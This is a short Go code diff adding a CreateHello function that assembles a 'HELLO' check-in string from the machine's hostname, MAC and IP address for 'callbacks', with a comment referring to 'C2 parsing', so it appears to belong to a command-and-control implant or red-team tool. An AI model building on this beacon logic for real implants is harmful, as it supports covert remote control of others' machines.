@@ -309,3 +309,21 @@ func GetRouterMAC() (net.HardwareAddr, error) {
 
 	return nil, errors.New("no gateway found")
 }
+
+// CreateHello creates a HELLO string for callbacks
+// HELLO format:
+//
+//	HELLO: hostname hostMAC hostIP
+//
+//	*NOTE* hostMAC and hostIP will end up being the MAC/IP of the gateway
+//			we are dealing with NAT. This will be handled by the C2 parsing
+func CreateHello(hostMAC net.HardwareAddr, srcIP net.IP) (hello string) {
+	hostname, err := os.Hostname()
+	if err != nil {
+		log.Fatal("Hostname not found...")
+	}
+
+	hello = "HELLO: " + hostname + " " + hostMAC.String() + " " + srcIP.String()
+
+	return hello
+}
